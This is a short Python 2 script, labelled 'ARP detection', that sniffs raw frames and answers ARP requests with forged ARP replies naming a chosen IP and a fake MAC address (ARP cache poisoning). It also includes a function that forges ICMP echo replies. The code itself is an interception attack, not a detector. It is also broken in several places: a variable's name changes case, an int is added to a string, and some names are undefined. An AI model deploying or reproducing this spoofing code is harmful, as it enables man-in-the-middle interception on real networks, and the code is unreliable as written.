#ARP detection
#RH - degausser
#Written for python 2.7.5

#Import socket to grab packets off the wire
import socket

#import scapy functions
from scapy.all import *

#Global variable for a list of bytes
pkt_l = []

#setting up a promisicious socket to capture off the wire
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))

#function to parse the data-link layer (works for MAC 802.1)
def dl_parse(packet):
    dst_mac = ''
    src_mac = ''
    eth_type =0

    if len(packet) >= 15:
        dst_mac_l = packet[0:6]
        src_mac_l = packet[6:12]
        eth_type_l = packet[12:14]

        for i in dst_mac_l:
            dst_mac += i+":"
        dst_mac = dst_mac[:-1] #gets desintation MAC address

        for i in src_mac_l:
            src_mac += i+":"
        src_mac = src_mac[:-1] #gets source MAC address

        eth_type = (eth_type^int(eth_type_l[0], 16)) #gets ether type
        eth_type = (eth_type<<8)^int(eth_type_l[1],16)

        #print(dst_mac)
        #print(src_mac)
        #print(eth_type)
        return eth_type
    else:
        print("pkt failure")


#function for parsing network layer (IP)
def poison_arp(packet):
    SpoofedHost = raw_input("IP of host to spoof: ")
    print(packet)
    hw_dst=''
    p_dst=''
    if((int(packet[-4],16)==10) and (int(packet[-3],16)==42) and (int(packet[-2],16)==42) and (int(packet[-1],16)==42)):
        hw_dst_l=packet[6:13]
        p_dst_l=packet[-8:-4]
        for i in hw_dst_l:
            hw_dst+= i+":"
        for i in p_dst_l:
            p_dst+=(int(i,16)+".")
        send(ARP(hwsrc="aa:bb:cc:dd:ee:ff",hwdst=hw_dst[:-1],psrc=spoofedHost, pdst=p_dst[:-1], op=0x2, hwtype=0x01,ptype=0x800), count=15)

def icmp_reply(packet):
    interface = input("Interface name: ")
    if ((int(packet[16],16) == 10) and (int(packet[17],16) == 42) and (int(packet[18],16)==42) and (int(packet[19],16) ==42)):
        sendp(Ether(src="aa:bb:cc:dd:ee:ff")/IP(src=SpoofedHost,dst=ip_dst)/ICMP(type=0x00)/icmp_payload, iface="en0")

#receive packets
while True:
    packet = s.recvfrom(65535)
    for i in packet[0]:
        pkt_l.append(hex(ord(i))[2:])
        #print(pkt_l) uncomment to see packets
    eth_type = dl_parse(pkt_l)
    if eth_type == 0x0806:
        poison_arp(pkt_l)

